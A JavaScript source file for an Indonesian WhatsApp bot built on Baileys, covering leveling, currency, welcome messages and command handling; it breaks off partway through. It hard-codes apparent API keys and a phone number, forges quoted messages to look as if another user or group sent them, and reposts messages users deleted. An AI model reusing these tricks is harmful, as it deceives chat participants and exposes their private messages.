const {
   WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal") 
const moment = require("moment-timezone") 
const speed = require('performance-now')
const fs = require("fs") 
const crypto = require('crypto')
const util = require('util')
const os = require('os')
const imageToBase64 = require('image-to-base64')
const axios = require('axios')
const { color, bgcolor } = require('./lib/color')
const { bahasa } = require('./lib/bahasa')
const { negara } = require('./lib/kodenegara')
const { donasi } = require('./lib/donasi')
const { developer } = require('./lib/developer')
const { randompict } = require('./lib/randompict')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const { virtexs } = require('./lib/virtex')
const fontPath = ('./lib/Zahraaa.ttf')
const path = require('path')
const { exec, spawn } = require("child_process")
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const tiktod = require('tiktok-scraper')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const imgbb = require('imgbb-uploader')
const cd = 4.32e+7
const { removeBackgroundFromImageFile } = require('remove.bg')
const { ind } = require('./bahasa')
const a = '```'

/********** MENU SETTING **********/
const vcard = 'BEGIN:VCARD\n' //jangan ganti eror jngn nyesel
            + 'VERSION:3.0\n' //biarin aja eror jngn nyesel
            + 'FN:Darma\n' //ganti aja 
            + 'ORG: Darma Syamsi;\n' //ganti aja
            + 'TEL;type=CELL;type=VOICE;waid=6283106733687:+6283106733687\n'  //ganti nomor lu
            + 'END:VCARD' //jangan ganti eror jangan nyesel
prefix = '#' //terserah mau ganti apa gak
blocked = [] //biarin aja eror jngn nyesel
replitx = '*FOLLOW IG @darrma23*' 
ari = '*IG @darrma23*'
limitawal = 250 //terserah mau ganti apa gak 
memberlimit = 1 //terserah mau ganti apa gak 
namabot = 'Reneasy Botz'
cr = '*「 Reneasy Botz 」*' //ganti nama bot
status = "Public Bot Whatsapp" 
lolkey = '7652a3f7d33dcdf4ef295d00' //apikey nya beli sendiri
Xteam = '940675834e0f84eb' // apikey
apivhtear = 'FebyaCantek' //apikey beli sendiri
ZeksApi = 'DarrMa123' // isi apikey 
onlydev = '682aeab645ed61cf137cf971' // isi apikey
/******** OWNER NUMBER**********/

const ownerNumber = ["6283106733687@s.whatsapp.net"]   //ganti nomor lu
//###########
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam Kak'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang Kak'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore Kak'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang Kak'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi Kak'
                                         }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam Kak'
                                         }


/*********** LOAD FILE ***********/
const _leveling = JSON.parse(fs.readFileSync('./database/kelompok/leveling.json'))
const antilink = JSON.parse(fs.readFileSync('./database/kelompok/antilink.json'))
const antitelegram = JSON.parse(fs.readFileSync('./database/kelompok/antitelegram.json'))
const antilinkig = JSON.parse(fs.readFileSync('./database/kelompok/antilinkig.json'))
const antilinkfb = JSON.parse(fs.readFileSync('./database/kelompok/antilinkfb.json'))
const antilinkytv = JSON.parse(fs.readFileSync('./database/kelompok/antilinkyt.json'))
const antilinkytc = JSON.parse(fs.readFileSync('./database/kelompok/antilinkytchannel.json'))
const antivirtex = JSON.parse(fs.readFileSync('./database/kelompok/antivirtex.json'))
const antispam = JSON.parse(fs.readFileSync('./database/kelompok/antispam.json'))
const _level = JSON.parse(fs.readFileSync('./database/pengguna/level.json'))
const _registered = JSON.parse(fs.readFileSync('./database/bot/pengguna.json'))
const welkom = JSON.parse(fs.readFileSync('./database/bot/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/bot/nsfw.json'))
const samih = JSON.parse(fs.readFileSync('./database/bot/simi.json'))
const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/pengguna/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/pengguna/uang.json'))
const ban = JSON.parse(fs.readFileSync('./database/pengguna/banned.json'))
const prem = JSON.parse(fs.readFileSync('./database/pengguna/premium.json'))
const adm = JSON.parse(fs.readFileSync('./database/pengguna/admin.json'))
const bad = JSON.parse(fs.readFileSync('./database/kelompok/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/kelompok/badword.json'))
/*********** END LOAD ***********/

/********** FUNCTION ***************/
const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
        }
             
         const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }

        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/bot/pengguna.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        
        const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
            }
        }
        
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
            }
        }
        
        const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
             
        
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
}
/********** FUNCTION ***************/

console.log(color('WELCOME DI WA CONNECTION CHENKK, SILAHKAN SCAN KODE DI BAWAH','green'))
console.log(color('SCRIPT INI DISUSUN ULANG OLEH DARMA','blue'))
const client = new WAConnection()
//WWEB 
client.version = [2, 2119, 6]
   client.on('qr', qr => {
   qrcode.generate(qr, { small: true })
})		
client.on('credentials-updated', () => {
	const authInfo = client.base64EncodedAuthInfo()
   console.log(`credentials updated!`)
   fs.writeFileSync('./fernazer.json', JSON.stringify(authInfo, null, '\t'))
})
client.on("CB:Call", json => {
		let call;
		calling = JSON.parse(JSON.stringify(json))
		call = calling[1].from
		setTimeout(function(){
			client.blockUser(call, "add")
			}, 0);
		})
fs.existsSync('./fernazer.json') && client.loadAuthInfo('./fernazer.json')
client.connect();


client.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await client.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Hallo @${num.split('@')[0]}\nSelamat datang di group *${mdata.subject}*\nSemoga betah ya di sini 😅\nJangan lupa intro @${num.split('@')[0]} 😅`
 
				let buff = await getBuffer(ppimg)
				client.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
				} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await client.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
					teks = `Telah out
 @${num.split('@')[0]}\n❰ *SELAMAT JALAN KAWAN*❱`
				let buff = await getBuffer(ppimg)
				client.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
	client.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
client.on('message-update', async (mek) => {
		try {
		
		//HARI & BULAN
var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Jam : " + jam + ":" + menit + ":" + detik + " Wib";
//-
		//Update By Fernazer
	   const from = mek.key.remoteJid
		const messageStubType = WA_MESSAGE_STUB_TYPES[mek.messageStubType] || 'MESSAGE'
		const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
		const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
		const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
		const sender = mek.key.fromMe ? client.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const isRevoke = mek.key.remoteJid.endsWith('@s.whatsapp.net') ? true : mek.key.remoteJid.endsWith('@g.us') ? dataRevoke.includes(from) : false
		const isCtRevoke = mek.key.remoteJid.endsWith('@g.us') ? true : dataCtRevoke.data ? true : false
		const isBanCtRevoke = mek.key.remoteJid.endsWith('@g.us') ? true : !dataBanCtRevoke.includes(sender) ? true : false
		if (messageStubType == 'REVOKE') {
			console.log(`Status untuk grup : ${!isRevoke}\nStatus semua kontak : ${!isCtRevoke}\nStatus kontak dikecualikan : ${!isBanCtRevoke}`)
			if (!isRevoke) return
			if (!isCtRevoke) return
			if (!isBanCtRevoke) return
			const from = mek.key.remoteJid
			const isGroup = mek.key.remoteJid.endsWith('@g.us') ? true : false
			let int
			let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
			const id_deleted = mek.key.id
			const conts = mek.key.fromMe ? client.user.jid : client.contacts[sender] || { notify: jid.replace(/@.+/, '') }
			const pushname = mek.key.fromMe ? client.user.name : conts.notify || conts.vname || conts.name || '-'
			const opt4tag = {
				contextInfo: { mentionedJid: [sender] }
			}
			for (let i = 0; i < infoMSG.length; i++) {
				if (infoMSG[i].key.id == id_deleted) {
					const dataInfo = infoMSG[i]
					const type = Object.keys(infoMSG[i].message)[0]
					const timestamp = infoMSG[i].messageTimestamp
					int = {
						no: i,
						type: type,
						timestamp: timestamp,
						data: dataInfo
				    }    
				}
			}
			const index = Number(int.no)
			const body = int.type == 'conversation' ? infoMSG[index].message.conversation : int.type == 'extendedTextMessage' ? infoMSG[index].message.extendedTextMessage.text : int.type == 'imageMessage' ? infoMSG[index].message.imageMessage.caption : int.type == 'stickerMessage' ? 'Sticker' : int.type == 'audioMessage' ? 'Audio' : int.type == 'videoMessage' ? infoMSG[index].videoMessage.caption : infoMSG[index]
			const mediaData = int.type === 'extendedTextMessage' ? JSON.parse(JSON.stringify(int.data).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : int.data
			var itsme = `${numbernye}@s.whatsapp.net`
				var split = `${fake}`
				// var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
				var selepbot72 = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}			
			if (int.type == 'conversation' || int.type == 'extendedTextMessage') {
				const strConversation = `		 「 *ANTI-DELETE* 」

- *Nama :* *${pushname}* 
- *Nomer :* ${sender.replace('@s.whatsapp.net', '')}
- *Tipe :* Text
- *Waktu :* *${moment.unix(int.timestamp).format('HH:mm:ss')}*
- *Tanggal :* *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*
- *Pesan :* *${body ? body : '-'}*`
				client.sendMessage(from, strConversation, MessageType.text, selepbot72)
			} else if (int.type == 'stickerMessage') {
				var itsme = `${numbernye}@s.whatsapp.net`
					var split = `${fake}`
					const pingbro23 = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await client.downloadAndSaveMediaMessage(int.data, `./media/sticker/${filename}`);
				const strConversation = `		 「 *ANTI-DELETE* 」

- *Nama :* *${pushname}* 
- *Nomer :* ${sender.replace('@s.whatsapp.net', '')}
- *Tipe :* *Sticker*
- *Waktu :* *${moment.unix(int.timestamp).format('HH:mm:ss')}*
- *Tanggal :* *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*`

				const buff = fs.readFileSync(savedFilename)
				client.sendMessage(from, strConversation, MessageType.text, opt4tag)
				client.sendMessage(from, buff, MessageType.sticker, pingbro23)
				// console.log(stdout)
				fs.unlinkSync(savedFilename)

			} else if (int.type == 'imageMessage') {
				var itsme = `${numbernye}@s.whatsapp.net`
					var split = `${fake}`
					const pingbro22 = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await client.downloadAndSaveMediaMessage(int.data, `./media/revoke/${filename}`);
				const buff = fs.readFileSync(savedFilename)
				const strConversation = `	 「 *ANTI-DELETE* 」

- *Nama :* *${pushname}* 
- *Nomer :* ${sender.replace('@s.whatsapp.net', '')}
- *Tipe :* Image
- *Waktu :* *${moment.unix(int.timestamp).format('HH:mm:ss')}*
- *Tanggal :* *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*
- *Pesan :* ${body ? body : '-'}\`\`\``
				client.sendMessage(from, buff, MessageType.image, { contextInfo: { mentionedJid: [sender] }, caption: strConversation })
				fs.unlinkSync(savedFilename)
			}
		}
	} catch (e) {
		console.log('Message : %s', color(e, 'green'))
		// console.log(e)
	}
})

	client.on('CB:Blocklist', json => {

		if (blocked.length > 2) return

	    for (let i of json[1].blocklist) {

	    	blocked.push(i.replace('c.us','s.whatsapp.net'))

	    }

	})

	client.on('message-new', async (mek) => {
	
		try {
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM/YY HH:mm.ss')
			const wib = moment.tz('Asia/Jakarta').format('HH:mm.ss')
			const wita = moment.tz('Asia/Makassar').format("HH:mm.ss")
            const wit = moment.tz('Asia/Jayapura').format("HH:mm.ss")
			const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
			const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			const tescuk = ["0@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const q = args.join(' ')
			const botNumber = client.user.jid
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			pushname = client.contacts[sender] != undefined ? client.contacts[sender].vname || client.contacts[sender].notify : undefined
			const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const totalchat = await client.chats.all()
			/*const ultah = new Date('2022','05','05').valueOf()*/
			/*const tungmun = moment(ultah - Date.now()).format('DD [Hari], HH [Jam], mm [Menit], ss [Detik]')*/
			const hour_now = moment().format('HH:mm:ss')
			const hariRaya = new Date('Sep 5, 2022 08:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
           	
            /************** SCURITY FEATURE ************/
            const isEventon = isGroup ? event.includes(from) : false
            const isBadWord = isGroup ? badword.includes(from) : false
            const isRegistered = checkRegisteredUser(sender)
            const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
            const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
			const isAntilink = isGroup ? antilink.includes(from) : false
			const isAntiLinkTelegram = isGroup ? antitelegram.includes(from) : false
			const isAntiSpam = isGroup ? antispam.includes(from) : false
			const isAntiLinkig = isGroup ? antilinkig.includes(from) : false
            const isAntiLinkfb = isGroup ? antilinkfb.includes(from) : false
			const isAntiLinkytc = isGroup ? antilinkytc.includes(from) : false
            const isAntiLinkytv = isGroup ? antilinkytv.includes(from) : false
            const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			const isBanned = ban.includes(sender)
			const isPremium= prem.includes(sender)
			const isAdmin = adm.includes(sender)
			const isImage = type === 'imageMessage'
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				client.sendMessage(from, teks, text, {quoted:mek})
			}
			const sendMess = (hehe, teks) => {
				client.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
			const sendImage = (teks) => {
		    client.sendMessage(from, teks, image, {quoted:mek})
		    }
		    const costum = (pesan, tipe, target, target2) => {
			client.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
		    const sendPtt = (teks) => {
		    client.sendMessage(from, audio, mp3, {quoted:mek})
		    }
	        /*****************END SCURITY FEATURE ********/
	        
	        //WAKTU
			var ase = new Date();
                        var waktoo = ase.getHours();
                        switch(waktoo){
                case 0: waktoo = "_Waktu Tengah Malam🌚 - Tidur Kak :)_"; break;
                case 1: waktoo = "_Waktu Tengah Malam🌚 - Tidur Kak :)_"; break;
                case 2: waktoo = "_Waktu Dini Hari🌒 - Tidur Kak :)_"; break;
                case 3: waktoo = "_Waktu Dini Hari🌓 - Tidur Kak :)_"; break;
                case 4: waktoo = "_Subuh🌔_"; break;
                case 5: waktoo = "_Subuh🌔_"; break;
                case 6: waktoo = "_Selamat Pagi kak🌝🌝_"; break;
                case 7: waktoo = "_Selamat Pagi kak🌝🌝_"; break;
                case 8: waktoo = "_Selamat Pagi kak🌝🌝_"; break;
                case 9: waktoo = "_Selamat Pagi kak🌝 kak🌝_"; break;
                case 10: waktoo = "_Selamat Pagi kak🌝_"; break;
                case 11: waktoo = "_Selamat Siang Kak🌞_\n _- Jangan Lupa Shalat Dzuhur_"; break;
                case 12: waktoo = "_Selamat Siang Kak🌞_\n _- Jangan Lupa Shalat Dzuhur_"; break;
                case 13: waktoo = "_Selamat Siang Kak🌞_\n _- Jangan Lupa Shalat Dzuhur_"; break;
                case 14: waktoo = "_Selamat Siang Kak🌞_\n _- Jangan Lupa Beristirahat :)_"; break;
                case 15: waktoo = "_Selamat Sore Kak🌝_\n _-  Jangan Lupa Mandi Dan shalat ashar_"; break;
                case 16: waktoo = "_Selamat Sore Kak🌝_\n _ - Jangan Lupa Mandi Dan shalat ashar_"; break;
                case 17: waktoo = "_Selamat Sore Kak🌖_\n _- Menjelang Malam🌚_"; break;
                case 18: waktoo = "_Waktu Magrib🌘_\n_ - Jangan Lupa Shalat Magrib Kak_"; break;
                case 19: waktoo = "_Waktu Magrib🌚_"; break;
                case 20: waktoo = "_Selamat Malam🌚_"; break;
                case 21: waktoo = "_Selamat Malam🌚_"; break;
                case 22: waktoo = "_Selamat Malam🌚_\n - Jangan Lupa Beristirahat & Jangan Gadang_"; break;
                case 23: waktoo = "_Tengah Malam🌚_ \n - Tidur Kak, Ga baik bergadang :_)"; break;
            }
            var tampilHari = "" + waktoo;
            //-
            //WAKTU BUAT FAKEREPLY
            var ase = new Date();
                        var waktoonyabro = ase.getHours();
                        switch(waktoonyabro){
                case 0: waktoonyabro = `Selamat Malam 🌛`; break;
                case 1: waktoonyabro = `Selamat Malam 🌛`; break;
                case 2: waktoonyabro = `Selamat Malam 🌛`; break;
                case 3: waktoonyabro = `Selamat Pagi ✨`; break;
                case 4: waktoonyabro = `Selamat Pagi ✨`; break;
                case 5: waktoonyabro = `Selamat Pagi ✨`; break;
                case 6: waktoonyabro = `Selamat Pagi ✨`; break;
                case 7: waktoonyabro = `Selamat Pagi ✨`; break;
                case 8: waktoonyabro = `Selamat Pagi ✨`; break;
                case 9: waktoonyabro = `Selamat Pagi ✨`; break;
                case 10: waktoonyabro = `Selamat Pagi ✨`; break;
                case 11: waktoonyabro = `Selamat Siang 🔥`; break;
                case 12: waktoonyabro = `Selamat Siang 🔥`; break;
                case 13: waktoonyabro = `Selamat Siang 🔥`; break;
                case 14: waktoonyabro = `Selamat Siang 🔥`; break;
                case 15: waktoonyabro = `Selamat Sore 🌹`; break;
                case 16: waktoonyabro = `Selamat Sore 🌹`; break;
                case 17: waktoonyabro = `Selamat Sore 🌹`; break;
                case 18: waktoonyabro = `Selamat Malam 🌛`; break;
                case 19: waktoonyabro = `Selamat Malam 🌛`; break;
                case 20: waktoonyabro = `Selamat Malam 🌛`; break;
                case 21: waktoonyabro = `Selamat Malam 🌛`; break;
                case 22: waktoonyabro = `Selamat Malam 🌛`; break;
                case 23: waktoonyabro = `Selamat Malam 🌛`; break;
            }
            var YahahaHayyuk = "" + waktoonyabro;
            //-
            const freply = { key: { fromMe: false, participant: `6283106733687@s.whatsapp.net`, ...(from ? { remoteJid: "6283136505591-1614953337@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/png", "caption": `${YahahaHayyuk}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./lib/logo.jpeg')} } }
			const fkontak = { key: { fromMe: false, participant: `6283106733687@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${YahahaHayyuk}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${YahahaHayyuk},;;;\nFN:${YahahaHayyuk},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail": fs.readFileSync('./lib/logo.jpeg')}}}
			const ftoko = { key: { fromMe: false, participant: `6283106733687@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": fs.readFileSync('./src/logobot.jpg') }, "title": `Subrek ItsAra`, "productImageCount": 9999 }, "businessOwnerJid": `6283106733687@s.whatsapp.net`}}}

           
            
	        // BATES SU
			const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
            const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
            const buruh3 = ['🗿','🛢','🔮','🎄','🎃','🐦','🍉','🍈','🍜','🎎']
            const buruh4 = ['🗿','🍐','🐦','🍇','🍒','🍋','🛢','🔮','🎄','🎃','🍓','🍉','🍈','🍜','🎎']
			const slot1 = ['🍋','🍐','🍓','🍇','🍒']
            const slot2 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot3 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot4 = ['??','🍐','🍓','🍇','🍒'] 
            const slot5 = ['🍋','🍐','🍓','🍇','🍒']
            const slot6 = ['🍋','🍐','🍓','🍇','🍒'] 
            const slot7 = ['🍋','🍐','🍓','🍇','🍒']
